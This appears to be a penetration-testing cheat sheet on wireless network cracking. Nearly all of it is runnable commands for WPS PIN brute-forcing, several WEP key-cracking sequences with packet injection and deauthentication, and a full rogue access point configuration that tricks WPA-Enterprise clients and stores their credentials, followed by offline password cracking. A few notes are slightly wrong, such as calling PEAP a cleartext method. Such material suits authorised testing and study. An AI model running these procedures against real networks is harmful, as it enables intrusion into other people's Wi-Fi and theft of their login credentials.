# wireless-cracking

## Table Of Content
  * [Info Gathering](#info-gathering)
  * [WPS Attack](#wps-attack)
  * [WEP Cracking (Clientless)](#wep-cracking-clientless)
  * [WEP Cracking (Connected Client)](#wep-cracking-connected-client)
  * [WEP Cracking (Connected Client [Other Method])](#wep-cracking-connected-client-other-method)
  * [WPA-Enterprise Cracking](#wpa-enterprise-cracking)
  * [Connect Wi-Fi through CLI](#connect-wi-fi-through-cli)

## Info Gathering
- Get MAC Address of wireless network card
```
macchanger --show <INTERFACE>
```
- List wireless network info
```
iwconfig
```

## WPS Attack
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
wash -i wlan0mon
```
3. Crack the pin
```
sudo reaver -b <bssid of the AP> -i wlan0mon -v -K
```

## WEP Cracking (Clientless)
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
airodump-ng wlan0mon
```
3. Capture the traffic and specify the Target AP
```
sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
```
4. Do a fake authentication
```
aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
```
5. If no client then do a fragmentation attack (-5) and obtain the Keystream file (If fragmentation not success then use Chopchop technique -4)
```
aireplay-ng -5 -b <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```
6. Then the Keystream file (.xor) is obtained
7. Create ARP packet
```
packetforge-ng -0 -a <bssid of the AP> -h <wireless card MAC addr> -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor(Keystream file) -w arp-request
```
8. Inject the forged ARP packet
```
aireplay-ng -2 -r arp-request wlan0mon
```
9. Crack and obtain wireless key
```
aircrack-ng -b <bssid of the AP> <captured file (.cap)>
```

## WEP Cracking (Connected Client)
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
airodump-ng wlan0mon
```
3. Capture the traffic and specify the Target AP
```
sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
```
4. Do a fake authentication
```
aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
```
5. Then the Keystream file (.xor) is obtained
6. Do a fake authentication again with Keystream file
```
aireplay-ng -1 0 -e <wifi name(ssid)> -y <obtained_keystreamfile> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
```
7. Do a ARP replay attack
```
aireplay-ng -3 -b <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```
8. Crack and obtain wireless key
```
aircrack-ng -b <bssid of the AP> <captured file (.cap)>
```

## WEP Cracking (Connected Client [Other Method])
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
airodump-ng wlan0mon
```
3. Capture the traffic and specify the Target AP
```
sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
```
4. Do a fake authentication
```
aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
```
**-----If Fake authentication not working-----** 

5. Interactive packet replay attack
```
aireplay-ng -2 -b <bssid of the AP> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <INTERFACE>
```
or
```
aireplay-ng -2 -r <captured file (.cap)> wlan0mon
```
6. Crack and obtain wireless key
```
aircrack-ng <captured file (.cap)>
```
**-----If Fake authentication working-----** 

5. Do a ARP replay attack
```
aireplay-ng -3 -b <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```
6. Do a Deauthentication attack
```
aireplay-ng -0 1 -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
```
8. Crack and obtain wireless key
```
aircrack-ng <captured file (.cap)>
```
## WPA-Enterprise Cracking
1. Put the interface into monitor mode
```
airmon-ng start wlan0
```
2. Gain the information of the interface
```
airodump-ng wlan0mon
```
3. Capture the traffic and specify the Target AP
```
sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
```
4. Use freeradius to craft a CA certificate
6. Remove the current DH and regenerate Diffie-Hellman (DH)
```
rm dh
```
```
make
```

7. Configure hostapd-mana to host a rougue AP
8. Edit the configuration file
```
nano /etc/hostapd-mana/mana.conf
```
```
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

9. Create EAP user file
```
nano /etc/hostapd-mana/mana.eap_user
```
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
10. Start the rogue AP
```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
11. Crack the password
```
asleap -C <challengekey> -R <responsekey> -W /usr/share/john/password.lst
```

**Manual Craft CA cert**
```
sudo openssl dhparam -out dh 2048
sudo openssl req -new x509 -days 60 -nodes -out ca.pem -keyout ca.key // openssl req -x509 -days 60 -nodes -keyout ca.key -out ca.pem
sudo openssl req -new -nodes server.csr -keyout server.key // openssl req -new -nodes -keyout server.key -out server.csr
sudo openssl x509 -req -days 60 -in server.csr -CA ca.pem -CAkey ca.key -set_serial 03 -out server.pem
```

## Connect Wi-Fi through CLI
- WPA Personal
```
network={
   ssid="target ssid"
   scan_ssid=1
   psk="passphrase"
   key_mgmt=WPA-PSK
}
```
```
sudo wpa_supplicant -i wlan0 -c <config_file>
dhclient wlan0 -v
```
- WPA Enterprise
```
network={
   ssid="target ssid"
   key_mgmt=WPA-EAP
   eap=PEAP
   identity="domain\user"
   password="password"
   phase2="auth=MSCHAPV2"
}
```
```
sudo wpa_supplicant -i wlan0 -c <config_file>
dhclient wlan0 -v
```
- WEP
```
network={
    ssid="target ssid"
    key_mgmt=NONE
    wep_key0="your_wep_key"
    wep_tx_keyidx=0
}
```
```
sudo wpa_supplicant -i wlan0 -c <config_file>
dhclient wlan0 -v
```

**EAP Scheme**

1. PEAP with GTC (Generic Token Card):

   - EAP Phase I: PEAP (Protected Extensible Authentication Protocol)
   - EAP Phase II: GTC (Generic Token Card)
- PEAP provides a secure tunnel for transporting authentication data.
- GTC is a simple authentication method typically used with token cards for authentication.

2. PEAP with MSCHAPv2 (Microsoft Challenge Handshake Authentication Protocol version 2):

   - EAP Phase I: PEAP
   - EAP Phase II: MSCHAPv2
- MSCHAPv2 is a widely used authentication protocol, particularly with Microsoft Windows networks.
- PEAP provides the secure tunnel for data transport.

3. TTLS (Tunneled Transport Layer Security) with PAP (Password Authentication Protocol):

   - EAP Phase I: TTLS
   - EAP Phase II: PAP
- TTLS establishes a secure tunnel for authentication.
- PEAP is a simple authentication method where the password is sent in clear text.

4. TTLS with CHAP (Challenge-Handshake Authentication Protocol):

   - EAP Phase I: TTLS
   - EAP Phase II: CHAP
- CHAP is a challenge-response authentication protocol.

5. TTLS with MSCHAPv2:

   - EAP Phase I: TTLS
   - EAP Phase II: MSCHAPv2
- MSCHAPv2 provides secure authentication within the TTLS tunnel.
